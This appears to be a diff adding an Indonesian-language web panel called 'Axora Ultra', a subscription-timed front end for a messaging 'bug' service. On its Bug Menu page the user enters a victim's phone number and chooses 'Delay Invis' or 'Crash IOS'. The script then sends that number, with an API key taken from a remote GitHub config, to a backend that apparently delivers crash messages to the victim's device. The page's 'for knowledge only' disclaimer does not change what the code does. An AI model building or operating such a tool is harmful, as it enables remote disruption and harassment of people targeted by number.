@@ -1,0 +1,279 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Axora Ultra</title>
+<style>
+    body { margin:0; padding:0; background:#000; color:white; font-family:Arial; }
+    .header { display:flex; justify-content:space-between; align-items:center; border:2px solid red; border-radius:8px; margin:8px; padding:6px 10px; font-size:14px; }
+    .logout-btn { padding:6px 10px; border:2px solid red; border-radius:8px; background:transparent; color:white; cursor:pointer; }
+    .logout-btn:hover { background:red; color:black; }
+    .container { text-align:center; margin-top:20px; }
+    .logo { width:200px; }
+    .title { font-size:38px; font-weight:bold; margin:20px 0; }
+    .btn { display:block; width:80%; max-width:250px; margin:12px auto; padding:12px; border:2px solid red; border-radius:10px; background:transparent; color:red; font-size:18px; font-weight:bold; cursor:pointer; transition:0.3s; }
+    .btn:hover { background:red; color:black; }
+    .footer { margin-top:200px; font-size:14px; }
+    .fade-in { animation: fadeIn 0.5s ease-in; }
+    @keyframes fadeIn { from{opacity:0;} to{opacity:1;} }
+
+    /* Settings Icon */
+    .settings-btn { position:absolute; top:80px; left:15px; background:none; border:none; cursor:pointer; }
+    .settings-btn img { width:40px; height:40px; filter:invert(100%); }
+
+    /* Loader */
+    .loader { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); display:none; justify-content:center; align-items:center; z-index:999; }
+    .loader.active { display:flex; }
+    .loader div { width:60px; height:60px; border:8px solid #fff; border-top:8px solid red; border-radius:50%; animation:spin 1s linear infinite; }
+    @keyframes spin { 100% { transform:rotate(360deg);} }
+
+    .box { border:2px solid red; border-radius:12px; padding:15px; margin:20px auto; max-width:320px; }
+    .input-style { width:80%; padding:10px; margin:10px 0; border:2px solid red; border-radius:8px; background:#000; color:white; }
+
+    /* Switch Music */
+    .switch-container { display:flex; justify-content:space-between; align-items:center; padding:15px; border:2px solid red; border-radius:12px; margin:15px auto; width:90%; max-width:300px; }
+    .switch { position:relative; display:inline-block; width:50px; height:24px; }
+    .switch input { display:none; }
+    .slider { position:absolute; cursor:pointer; top:0; left:0; right:0; bottom:0; background-color:#ccc; border-radius:24px; transition:.4s; }
+    .slider:before { position:absolute; content:""; height:18px; width:18px; left:3px; bottom:3px; background:white; border-radius:50%; transition:.4s; }
+    input:checked + .slider { background-color:#4CAF50; }
+    input:checked + .slider:before { transform:translateX(26px); }
+
+    /* Modal */
+    .modal { display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); justify-content:center; align-items:center; z-index:1000; }
+    .modal-content { background:#111; padding:20px; border:2px solid red; border-radius:10px; color:white; text-align:center; width:250px; }
+    .modal-content p { margin-bottom:15px; }
+    .modal-content button { background:red; border:none; padding:8px 15px; color:white; font-size:16px; border-radius:8px; cursor:pointer; }
+
+    /* Link Buttons */
+    .link-btn { display:inline-block; margin:10px; padding:10px 18px; background:transparent; color:white; border:2px solid red; border-radius:8px; text-decoration:none; font-size:16px; font-weight:bold; transition:0.3s; }
+    .link-btn:hover { background:red; color:black; }
+
+    /* Progress Bar */
+    .progress-container { width: 60%; margin: 8px auto; height: 8px; background: #222; border-radius: 10px; overflow: hidden; }
+    .progress-bar { height: 100%; width: 0%; background: linear-gradient(to right, red, orange, yellow, lime, green); transition: width 0.3s ease; }
+
+    /* Status API */
+    .status-container { margin-top: 15px; text-align: center; font-size: 18px; font-weight: bold; }
+    .status-dot { display: inline-block; width: 14px; height: 14px; border-radius: 50%; margin-right: 8px; vertical-align: middle; background-color: gray; }
+    #statusText { color: white; }
+</style>
+</head>
+<body>
+
+<!-- Loader -->
+<div class="loader" id="loader"><div></div></div>
+
+<!-- Modal -->
+<div class="modal" id="modalBox">
+    <div class="modal-content">
+        <p id="modalMessage">Pesan</p>
+        <button onclick="closeModal()">OK</button>
+    </div>
+</div>
+
+<!-- Audio -->
+<audio id="bgMusic" loop>
+    <source src="https://files.catbox.moe/1rijdg.mp3" type="audio/mpeg">
+</audio>
+
+<!-- HOME -->
+<div id="homePage" class="fade-in">
+    <div class="header">
+        <span id="greeting">Olá, User</span>
+        <span id="duration">Durasi: --</span>
+        <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+
+    <!-- Progress Bar -->
+    <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+
+    <!-- Tombol Pengaturan -->
+    <button class="settings-btn" onclick="showPage('settingsPage')">
+        <img src="https://cdn-icons-png.flaticon.com/512/3524/3524659.png" alt="Settings">
+    </button>
+
+    <div class="container">
+        <img src="https://files.catbox.moe/gmg7ha.jpg" class="logo">
+        <h1 class="title">AXORA ULTRA</h1>
+        <button class="btn" onclick="showPage('bugMenuPage')">Bug Menu</button>
+        <button class="btn" onclick="showPage('aboutPage')">About</button>
+        <button class="btn" style="color:white; background:red;" onclick="extendActive()">Perpanjang Masa Aktif</button>
+        <p class="footer">Created By Ryverzoffc</p>
+    </div>
+</div>
+
+<!-- BUG MENU -->
+<div id="bugMenuPage" class="container fade-in" style="display:none;">
+    <div class="header">
+        <span>Bug Menu</span>
+        <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+    <img src="https://files.catbox.moe/gmg7ha.jpg" class="logo">
+    <div class="box">
+        <input class="input-style" id="targetNumber" placeholder="Nomor Target (62xxx)">
+        <button class="btn" onclick="sendBug('andros')">Delay Invis</button>
+        <button class="btn" onclick="sendBug('ios')">Crash IOS</button>
+    </div>
+    <div class="status-container">
+        <span class="status-dot" id="statusDot"></span>
+        <span id="statusText">Checking...</span>
+    </div>
+    <button class="btn" onclick="showPage('homePage')">Back To Home</button>
+</div>
+
+<!-- ABOUT -->
+<div id="aboutPage" class="container fade-in" style="display:none;">
+    <div class="header">
+        <span>About</span>
+        <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+    <img src="https://files.catbox.moe/gmg7ha.jpg" class="logo">
+    <div class="box">
+        <h2 style="color:red;">About Axora</h2>
+        <p style="font-size:14px;">Tools ini dibuat untuk pengetahuan saja. Jangan gunakan tools ini untuk tindak kejahatan atau menyerang orang yang tidak bersalah.</p>
+        <p style="color:#888;"> Ryverzoffc</p>
+    </div>
+    <button class="btn" onclick="showPage('homePage')">Back To Home</button>
+</div>
+
+<!-- SETTINGS -->
+<div id="settingsPage" class="container fade-in" style="display:none;">
+    <div class="header">
+        <span>Settings</span>
+        <button class="logout-btn" onclick="logout()">Logout</button>
+    </div>
+    <div class="switch-container">
+        <span>Music</span>
+        <label class="switch">
+            <input type="checkbox" id="musicToggle">
+            <span class="slider"></span>
+        </label>
+    </div>
+    <div class="box">
+        <a class="link-btn" href="https://t.me/Ryverzoffc" target="_blank">Telegram</a>
+        <a class="link-btn" href="https://youtube.com/@ryverzoffc?si=FXCu5PueU_Ez3_bb" target="_blank">YouTube</a>
+        <a class="link-btn" href="https://whatsapp.com/channel/0029Vb7n7eg9RZAfkSEisP0M" target="_blank">WhatsApp Channel</a>
+        <a class="link-btn" href="https://t.me/ryverzofficial" target="_blank">Telegram Channel</a>
+    </div>
+    <button class="btn" onclick="showPage('homePage')">Back To Home</button>
+</div>
+
+<script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+<script>
+const username = localStorage.getItem('username');
+const expireTime = parseInt(localStorage.getItem('expireTime'), 10);
+if (!username || !expireTime) { window.location.href = "login.html"; }
+document.getElementById('greeting').textContent = `Olá, @${username}`;
+
+// API Config URL
+const apiConfigURL = 'https://raw.githubusercontent.com/Ryverzoffc/AxoraApiBug/refs/heads/main/apiConfig.json';
+
+function updateDuration() {
+    const now = Date.now();
+    const remaining = expireTime - now;
+    if (remaining <= 0) { showModal("Durasi habis!"); setTimeout(logout, 2000); return; }
+
+    const days = Math.floor(remaining / (1000*60*60*24));
+    const hours = Math.floor((remaining % (1000*60*60*24)) / (1000*60*60));
+    const minutes = Math.floor((remaining % (1000*60*60)) / (1000*60));
+    const seconds = Math.floor((remaining % (1000*60)) / 1000);
+
+    document.getElementById('duration').textContent = `Durasi: ${days}h ${hours}j ${minutes}m ${seconds}d`;
+    const total = 86400000; // 1 hari
+    const progress = Math.max(0, (remaining / total) * 100);
+    document.getElementById('progressBar').style.width = `${progress}%`;
+}
+setInterval(updateDuration, 1000);
+updateDuration();
+
+function showLoader(){ document.getElementById('loader').classList.add('active'); }
+function hideLoader(){ document.getElementById('loader').classList.remove('active'); }
+function showModal(msg){ document.getElementById('modalMessage').textContent = msg; document.getElementById('modalBox').style.display='flex'; }
+function closeModal(){ document.getElementById('modalBox').style.display='none'; }
+
+function showPage(pageId){
+    showLoader();
+    setTimeout(()=>{
+        document.querySelectorAll('div[id$="Page"]').forEach(el=>el.style.display='none');
+        document.getElementById(pageId).style.display='block';
+        hideLoader();
+    },500);
+}
+
+function logout(){ localStorage.clear(); window.location.href = "login.html"; }
+function extendActive(){ window.location.href = "https://t.me/YourTelegram"; }
+
+// Music Toggle
+const musicToggle = document.getElementById('musicToggle');
+const bgMusic = document.getElementById('bgMusic');
+musicToggle.addEventListener('change', () => { if(musicToggle.checked){ bgMusic.play(); } else { bgMusic.pause(); } });
+
+// Load API config
+async function loadAPIConfig() {
+    try {
+        const response = await fetch(apiConfigURL);
+        const config = await response.json();
+        localStorage.setItem('apiConfig', JSON.stringify(config));
+    } catch (error) { console.error('Gagal memuat API config:', error); }
+}
+loadAPIConfig();
+
+// Check API Status
+async function checkAPIStatus() {
+    const apiConfig = JSON.parse(localStorage.getItem('apiConfig') || '{}');
+    const selectedAPI = apiConfig['andros'];
+    const statusDot = document.getElementById('statusDot');
+    const statusText = document.getElementById('statusText');
+
+    if (!selectedAPI) {
+        statusDot.style.backgroundColor = 'red';
+        statusText.textContent = 'DISCONNECT';
+        return;
+    }
+
+    try {
+        const response = await fetch(selectedAPI.base_url);
+        if (response.ok) {
+            statusDot.style.backgroundColor = 'lime';
+            statusText.textContent = 'CONNECTED';
+        } else {
+            statusDot.style.backgroundColor = 'red';
+            statusText.textContent = 'DISCONNECT';
+        }
+    } catch (error) {
+        statusDot.style.backgroundColor = 'red';
+        statusText.textContent = 'DISCONNECT';
+    }
+}
+setInterval(checkAPIStatus, 10000);
+checkAPIStatus();
+
+// Kirim Bug
+async function sendBug(mode){
+    const target = document.getElementById('targetNumber').value.trim();
+    if (!target){ showModal("Masukkan nomor terlebih dahulu"); return; }
+    if (!/^[0-9]+$/.test(target)){ showModal("Nomor hanya boleh angka"); return; }
+    if (!target.startsWith("62")){ showModal("Nomor harus diawali 62"); return; }
+    if (target.length < 10 || target.length > 15){ showModal("Nomor tidak valid"); return; }
+
+    const apiConfig = JSON.parse(localStorage.getItem('apiConfig') || '{}');
+    const selectedAPI = apiConfig[mode];
+    if (!selectedAPI){ showModal("API TIDAK AKTIF"); return; }
+
+    showLoader();
+    try{
+        const url = `${selectedAPI.base_url}?target=${target}&mode=${mode}&username=${selectedAPI.username}&key=${selectedAPI.key}`;
+        await axios.get(url);
+        showModal(`✅ Bug ${mode} berhasil dikirim`);
+    }catch(e){
+        showModal(`❌ Gagal mengirim bug ${mode}`);
+    }
+    hideLoader();
+}
+</script>
+</body>
+</html>
